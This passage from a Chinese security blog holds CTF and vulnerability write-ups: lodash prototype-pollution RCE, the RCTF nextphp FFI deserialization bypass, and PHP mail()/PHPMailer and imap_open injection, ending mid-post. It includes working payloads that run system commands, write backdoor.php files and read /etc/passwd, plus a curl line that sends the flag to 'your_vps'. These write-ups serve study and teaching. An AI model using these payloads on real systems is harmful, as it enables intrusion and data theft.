<h4 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h4><h5 id="原型链污染点"><a href="#原型链污染点" class="headerlink" title="原型链污染点"></a>原型链污染点</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    language: data.language, </span><br><span class="line">    category: data.category</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>在上面也说过原型链污染一般会出现在merge和clone中，那么这里的merge正好可以去触发原型链污染，而且req.body还是我们自行控制的，那么就可以造成原型链污染了</p>
<h5 id="漏洞点触发"><a href="#漏洞点触发" class="headerlink" title="漏洞点触发"></a>漏洞点触发</h5><p>这个漏洞触发倒是很仔细的分析了一波，分析了一下，也发现了一些很有意思的点。这里详细的记录分析一哈</p>
<p>正常的访问流程依然没变，先是把body中的数据传递到session中的data，然后渲染index页面，那么原型链污染的点是在data，我们下面就来仔细分析一下index的漏洞触发问题，首先跟进template函数，这个函数就是触发的关键了，因为后面的句子就是动态引入变量了，我们在template函数中需要找到一个未经过定义的变量这样才能通过这个变量拿到污染的值，这个变量就是sourceURL</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'//# sourceURL='</span> +</span><br><span class="line">  (<span class="string">'sourceURL'</span> <span class="keyword">in</span> options</span><br><span class="line">    ? options.sourceURL</span><br><span class="line">    : (<span class="string">'lodash.templateSources['</span> + (++templateCounter) + <span class="string">']'</span>)</span><br><span class="line">  ) + <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure>

<p>在正常传递payload的情况下我们可以去看一些sourceURL的值</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nHXw0s.png" alt="nHXw0s.png"></p>
<p>这就说明了options.sourceURL的值是未定义的，这就符合我们所需要的未定义的变量了，那么sourceURL在原型链污染的情况下最终的值就是我们的污染语句了，那么下面就接着跟一下这个template吧，最后template函数返回的变量是result，那么我们来看一下result的定义</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过Function匿名函数，importsValues以数组形式代表参数</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nbS1Rx.png" alt="nbS1Rx.png"></p>
<p>那么在原型链污染的情况下我们就可以控制sourceURL,提前return我们想要的污染语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\r\nreturn e &#x3D; () &#x3D;&gt; &#123;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()&#125;\r\n</span><br></pre></td></tr></table></figure>

<p>这里通过\r\n来逃避之前的注释，至于这里为什么要return一个匿名函数，之后会有一个解释，那么就继续跟进，将result返回给我们的compiled，再通过这个compiled去动态引入一些配置变量</p>
<p>不过这里有一个很有意思的地方，污染情况下和没污染的compiled的值对比如下</p>
<p>污染后</p>
<p><a href="https://imgchr.com/i/nbpfBD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/18/nbpfBD.png" alt="nbpfBD.png"></a></p>
<p>污染前</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nbpbgP.png" alt="nbpbgP.png"></p>
<p>从这两处对比来看其实我们可以发现命令执行应该是在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let rendered &#x3D; compied(&#123;...options&#125;)</span><br></pre></td></tr></table></figure>

<p>这里进行执行的，而且compiled在两处分别是对象函数与匿名函数，这里我有一个推测，就是必须要通过函数的形式来引入这些配置变量，这也就是为什么我们污染语句不是函数的话他就会报错的原因了，这里匿名函数执行到导致后面的源码无法渲染回来，所以我们原型链污染后他返回来的代码是我们命令执行的结果，并且没有一点之前的源码，最终得到 了我们的结果</p>
<p>PS：如果不是单独docker靶机的话，最好加个循环把污染的环境变量删掉，防止你的flag泄露</p>
<p>最后效果</p>
<p><a href="https://imgchr.com/i/nb9BKf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/18/nb9BKf.png" alt="nb9BKf.png"></a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://juejin.im/post/5b3798f851882574c105c51c" target="_blank" rel="noopener">https://juejin.im/post/5b3798f851882574c105c51c</a></p>
<p><a href="https://juejin.im/post/5b3dd222e51d4519226f204d" target="_blank" rel="noopener">https://juejin.im/post/5b3dd222e51d4519226f204d</a></p>
<p><a href="https://juejin.im/post/5cc99fdfe51d453b440236c3" target="_blank" rel="noopener">https://juejin.im/post/5cc99fdfe51d453b440236c3</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
<p><a href="https://paper.seebug.org/755/#hard-thejs" target="_blank" rel="noopener">https://paper.seebug.org/755/#hard-thejs</a></p>
<p><a href="https://blog.csdn.net/cc18868876837/article/details/81211729" target="_blank" rel="noopener">https://blog.csdn.net/cc18868876837/article/details/81211729</a></p>
<p><a href="https://blog.csdn.net/ylwdi/article/details/82805255" target="_blank" rel="noopener">https://blog.csdn.net/ylwdi/article/details/82805255</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF-nextphp</title>
    <url>/2019/06/03/RCTF-nextphp/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>终于抽出时间来复现了一下这道题，下面是复现流程</p>
<h3 id="next-php"><a href="#next-php" class="headerlink" title="next-php"></a>next-php</h3><p>题目代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看都有什么文件并且进行读取一下</p>
<p>列出文件</p>
<p><code>a=var_dump(glob(&#39;*.*&#39;));</code></p>
<p>回显结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">9</span>) <span class="string">"index.php"</span> [<span class="number">1</span>]=&gt; string(<span class="number">11</span>) <span class="string">"preload.php"</span> &#125;</span><br></pre></td></tr></table></figure>

<p>读取一下可疑文件<code>preload.php</code>，<code>a=show_source(&#39;preload.php&#39;);</code></p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">​        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 查看一下phpinfo</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3o77uxjwpj314v0773za.jpg" alt=""></p>
<p>可以看到通过<code>disable_functions</code>禁用了很多函数，并且进行了<code>open_basedir</code>限制</p>
<h4 id="攻击思考"><a href="#攻击思考" class="headerlink" title="攻击思考"></a>攻击思考</h4><p>可疑点存在于<code>preload.php</code>，查看一下官方手册有关于preload.php的信息</p>
<ul>
<li><a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">https://wiki.php.net/rfc/custom_object_serialization</a></li>
<li><a href="https://wiki.php.net/rfc/ffi#fficdef_string_cdef_string_lib_nullffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi#fficdef_string_cdef_string_lib_nullffi</a></li>
</ul>
<p>FFI调用函数方法如下</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3o80yhi6nj310g0cwgmv.jpg" alt=""></p>
<h5 id="所以我们可以通过FFI调用系统函数来bypass-disable-functions，并且当FFI-cdef不传第二个参数时，可以调用php源码中的函数。"><a href="#所以我们可以通过FFI调用系统函数来bypass-disable-functions，并且当FFI-cdef不传第二个参数时，可以调用php源码中的函数。" class="headerlink" title="所以我们可以通过FFI调用系统函数来bypass disable_functions，并且当FFI:cdef不传第二个参数时，可以调用php源码中的函数。"></a>所以我们可以通过<code>FFI</code>调用系统函数来<code>bypass disable_functions</code>，并且当FFI:cdef不传第二个参数时，可以调用php源码中的函数。</h5><p>而且这是一个自定义的序列化类，我们可以很明显的看出，在反序列化的时候会调用<code>unserialize</code>函数，在序列化的时候会调用<code>serialize</code>函数，这就是与普通序列化的不同之处。写下如下poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $data = [</span><br><span class="line"><span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line"><span class="string">'func'</span> =&gt; <span class="string">"FFI::cdef"</span>,</span><br><span class="line"><span class="string">'arg'</span> =&gt; <span class="string">"int system(const char *command);"</span> ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在反序列化的过程中调用unserialize函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ppublic <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将数组中<code>ret</code>赋值。</p>
<p>再通过__serialize函数去调用<code>ret</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>最终payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#39;curl your_vps&#x2F;&#96;cat flag&#96;&#39;);</span><br></pre></td></tr></table></figure>

<p>其实这里还可以通过__get方法去调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;ret-&gt;system(&#39;curl your_vps&#x2F;&#96;cat flag&#96;&#39;);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP邮件漏洞小结</title>
    <url>/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>本文首发于安恒讲武堂。</p>
<h2 id="PHP-mail-函数介绍"><a href="#PHP-mail-函数介绍" class="headerlink" title="PHP mail()函数介绍"></a><strong>PHP mail()函数介绍</strong></h2><p><img src="https://ask.qcloudimg.com/http-save/5426480/tryesk5twn.jpeg?imageView2/2/w/1620" alt="img"></p>
<h2 id="PHP-mail-函数利用姿势"><a href="#PHP-mail-函数利用姿势" class="headerlink" title="PHP mail()函数利用姿势"></a><strong>PHP mail()函数利用姿势</strong></h2><p>PHP中，mail的函数在底层是写好的，调用linux的sendmail程序来发送邮件，在额外参数中，sendmail还支持其他三个选项。</p>
<p>-X logfile ：指定一个文件来记录邮件发送的详细日志。</p>
<p>-C file：临时加载一个配置文件(<strong>可以读文件</strong>)。</p>
<p>-O option=value ：临时设置一个邮件储存的临时位置。</p>
<p><strong>任意文件写入</strong></p>
<p>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">'-f lihuaiqiu@1 -OQueueDirectory=/tmp/ -X/root/1.php'</span>;mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>

<p>实际运行命令为： <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-OQueueDirectory=/tmp/-X/root/1.php</code></p>
<p>此命令简写形式 <code>-f lihuaiqiu@1-oQ/tmp/-X/root/1.php</code>可突破某些字符限制的地方。</p>
<p>查看并运行邮件日志1.php回显:</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/o8zseonz16.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>成功将邮件内容写入日志,并进行了命令执行。</p>
<p><strong>任意文件读取</strong></p>
<p>代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">'-f lihuaiqiu@1 -C/etc/passwd -X/root/1.php'</span>;mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>

<p>实际运行命令: <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-C/etc/passwd-X/root/1.php</code></p>
<p>回显效果：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/1qqr8072a8.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>成功读取敏感数据文件。</p>
<p><strong>利用配置文件执行代码</strong></p>
<p>上述两种情况只建立在我们的目录有写权限以及写入的文件可以执行条件下，但是如果我们面临着没有写权限或者无法执行写入文件该怎么办呢，这时就要用到新的姿势，利用配置文件执行代码。</p>
<p>找到一个上传点，上传一个静态文件，文件内容为sendmail的配置文件内容并在末尾加上如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Mlocal,              P=<span class="regexp">/usr/</span>bin/php, F=lsDFMAw5:<span class="regexp">/|@qPn9S, S=EnvFromL/</span>HdrFromL,</span><br><span class="line">R=EnvToL/HdrToL,</span><br><span class="line">T=DNS/RFC822/X-Unix,</span><br><span class="line">A=php -- $u $h $&#123;client_addr&#125;</span><br></pre></td></tr></table></figure>

<p><strong>原理:系统默认使用sendmail-mta来解析邮件的内容，这里添加的内容目的是覆盖默认的解析，使用PHP来解析邮件内容。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">payload为 lihuaiqiu@<span class="number">1</span> -oQ/tmp -X ./upload/sendmail_cf</span><br></pre></td></tr></table></figure>

<p>实际执行的命令： <code>/usr/bin/sendmail-t-i-f lihuaiqiu@1-oQ/tmp-X./upload/sendmail_cf</code></p>
<p><strong>将邮件内容以php方式进行解析进行命令执行。</strong></p>
<h2 id="CVE-2016-10033分析"><a href="#CVE-2016-10033分析" class="headerlink" title="CVE-2016-10033分析"></a>CVE-2016-10033分析</h2><p>上面我们分析了PHP中mail函数产生的漏洞,而这个cve phpmailer正是因为第五个参数过滤的不严谨导致的漏洞,下面开始进行分析，代码在<a href="https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php</a></p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/cucu3a9o0r.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>首先定位找到mail函数,需要满足三个条件，才可以进行五个参数的mail函数执行,需满足：<strong>没有开启safe_mode模式以及$params非Null</strong>。</p>
<p>然后在接下来的代码寻找$params这个值是怎么来的</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/c97ghqguqh.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>很明显可以看到$params来自于$this-&gt;Sender，并且在下面的执行语句中，$params变量会传递进mailPassthru函数中进而给mail函数当作第五个参数。</p>
<p>接着跟进$this-&gt;sender</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/ih4s6yn97f.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>可以从函数中看出来，<strong>$address经过strpos函数以及validataAddress的检测，最终把值赋给$this-&gt;sender</strong>。</p>
<p>跟进validataAddress函数</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/ev2zm10o5c.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>可以看到依然用了strpos进行了一次检测，接着向下走会看到如果<strong>PHP_VERSION&lt;5.2的话</strong>，则选择noregex模式对$address进行检测</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/r78d9ge9wi.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>这是一个很鸡肋的检测，基本上payload中含有@就可以的。</p>
<p>最终构造exp: <code>lihuaiqiu@1-oQ/tmp-X/var/www/backdoor.php</code>，最终将日志文件写入backdoor.php中。</p>
<p>漏洞环境<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
<p>漏洞利用条件</p>
<p><strong>php version &lt; 5.2.0</strong> <strong>no pcre</strong> <strong>phpmailer &lt; 5.2.18</strong> <strong>php safe_mode = false</strong></p>
<p>exp回显截图</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/une987b3fb.jpeg?imageView2/2/w/1620" alt="img"></p>
<h2 id="Bypass-pcre8"><a href="#Bypass-pcre8" class="headerlink" title="Bypass pcre8"></a>Bypass pcre8</h2><p><img src="https://ask.qcloudimg.com/http-save/5426480/7qbsn6y04g.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>如果能bypass掉这个恶心的正则，那么利用条件就方便了很多，可以发现在@前面加括号就会可以进行bypass payload为 <code>a(-X/home/www/backdoor.php-OQueueDirectory=/tmp)@qq.com</code></p>
<h4 id="CVE-2016-10045分析"><a href="#CVE-2016-10045分析" class="headerlink" title="CVE-2016-10045分析"></a>CVE-2016-10045分析</h4><p><img src="https://ask.qcloudimg.com/http-save/5426480/c2js2jmmdq.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>主要更新点在于对于$this-&gt;Sender的函数过滤问题，下面来看一下这个函数的具体情况</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/qr993d2moo.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>其作用我放张图基本就会懂的</p>
<p>对于代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$str=<span class="string">"a'( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$c=escapeshellarg($str);echo $c;echo <span class="string">"&lt;/br&gt;"</span>;$str=<span class="string">"a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$b=escapeshellarg($str);echo $b;</span><br></pre></td></tr></table></figure>

<p>运行结果为</p>
<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
<p>‘a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
<p>可以看到此函数将传入的单引号进行了一次转义，并且自己为其他两端字符串添加了单引号，保证两端字符串正确解析.</p>
<p><strong>但是此时出现了问题,mail函数自带escapeshellcmd函数过滤</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/p2zj9db29o.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>对于这个函数，我们的上一个payload就会失效的 <code>a(-X/home/www/backdoor.php-OQueueDirectory=/tmp)@qq.com</code>，原因在于<strong>()</strong>被转义。</p>
<h2 id="escapeshellcmd与escapeshellarg导致参数注入"><a href="#escapeshellcmd与escapeshellarg导致参数注入" class="headerlink" title="escapeshellcmd与escapeshellarg导致参数注入"></a>escapeshellcmd与escapeshellarg导致参数注入</h2><p>当$this-&gt;sender同时被这两个参数处理的话，就会导致单引号逃逸，如下代码测试</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$str=<span class="string">"a'( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com"</span>;$c=escapeshellarg($str);echo $c;</span><br><span class="line">echo escapeshellcmd($c);</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com’</p>
<p>‘a’&#39;‘( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com&#39;</p>
<p>最终sendmail形式为 <code>-fa\(</code> , <code>-X/home/www/backdoor.php</code> , <code>-OQueueDirectory=/tmp</code> , <code>)@qq.com&#39;</code></p>
<p>本地测试代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$to = <span class="string">'a@b.c'</span>;$subject = <span class="string">'&lt;?php system("whoami"); ?&gt;'</span>;$message = <span class="string">'&lt;?php system("ls");?&gt;'</span>;$headers = <span class="string">''</span>;$options = <span class="string">"'-fa'\\''\( -OQueueDirectory=/tmp -X/root/lihuaiqiu.php \)@a.com\'"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ask.qcloudimg.com/http-save/5426480/83zujvj2rn.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>测试结果：</p>
<p>运行的时候会有一些报错的，但是仍然可以写入文件。</p>
<h2 id="imap-open-RCE-分析"><a href="#imap-open-RCE-分析" class="headerlink" title="imap_open RCE 分析"></a><strong>imap_open RCE 分析</strong></h2><p>imapopen为介绍的第二种漏洞，imapopen同样也常用于在php中<strong>bypass disable_functions</strong>。</p>
<h3 id="IMAP介绍"><a href="#IMAP介绍" class="headerlink" title="IMAP介绍"></a><strong>IMAP介绍</strong></h3><p>Internet消息访问协议(IMAP)是电子邮件客户端用于通过TCP/IP连接从邮件服务器检索电子邮件的Internet标准协议，IMAP服务器通常侦听端口号143，在php函数中，imap_open正用于打开邮箱的IMAP流。</p>
<p>函数介绍如下：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/myicbnpswj.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>mailbox参数详解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;[host]&#125;:[port][flags]&#125;[mailbox_name]</span><br></pre></td></tr></table></figure>

<ul>
<li>host：标准主机(服务器的域名或者IP地址)</li>
<li>port：主机端口</li>
<li>flags：可选标志</li>
<li>mailbox_name：远程邮箱名称，默认为INBOX</li>
</ul>
<p>flags可选标志列表如下： </p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/i2fhoomnie.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>具体链接：<a href="https://www.php.net/manual/zh/function.imap-open.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.imap-open.php</a></p>
<h3 id="漏洞主要触发原理"><a href="#漏洞主要触发原理" class="headerlink" title="漏洞主要触发原理:"></a>漏洞主要触发原理:</h3><p>如下实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@imap_open（<span class="string">'&#123;localhost&#125;：143 / imap&#125; INBOX'</span>，<span class="string">''</span>，<span class="string">''</span>）;</span><br></pre></td></tr></table></figure>

<p>分析：localhost为我们执行命令的参数之一，所以我们可以操纵服务器参数来构造恶意IMAP服务器来执行我们想要的命令，<strong>原理为：在php.ini中imap.enableinsecurersh参数为On的情况下</strong>,<strong>执行imap_open函数时/usr/bin/rsh被链接到ssh指令，所以通过ssh的-o选项我们可以进行命令执行</strong>。这里我们可以看一下ssh中可以执行命令的参数：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/87fuqh61re.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>通过这个参数，我们就可以执行我们想要的命令了。</p>
<p>例如官方exp中给出的命令</p>
<p>ssh -oProxyCommand =”echo hello | tee / tmp / executed”localhost</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/9md0tflbky.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>通过我做的两个实验的例子，可以很清晰的看出构造出来的恶意邮箱服务器参数所造成的危害。</p>
<p>但是在PHP中填写邮箱参数的时候却不能这么直白的将此恶意邮箱参数填写</p>
<p><strong>因为在解析的时候，PHP会将空格解释为分隔符以及斜杠作为标志，这里空格还是比较好绕过的，利用$IFS shell变量以及\t都可以进行替换空格，绕过斜杠的方法则是用base64进行编码。</strong></p>
<p>如：echo bHM=|base64 -d|bash等于与ls。</p>
<h3 id="docker中模拟测试"><a href="#docker中模拟测试" class="headerlink" title="docker中模拟测试"></a>docker中模拟测试</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">docker pull fedosov/docker-php-imap-composer</span><br><span class="line">docker run -i -t -d fedosov/docker-php-imap-composer /bin/bash</span><br><span class="line">docker exec -it <span class="number">9017603</span>a0e13 /bin/bash</span><br></pre></td></tr></table></figure>

<p>模拟一个imap的邮件发送脚本，脚本代码如下：</p>
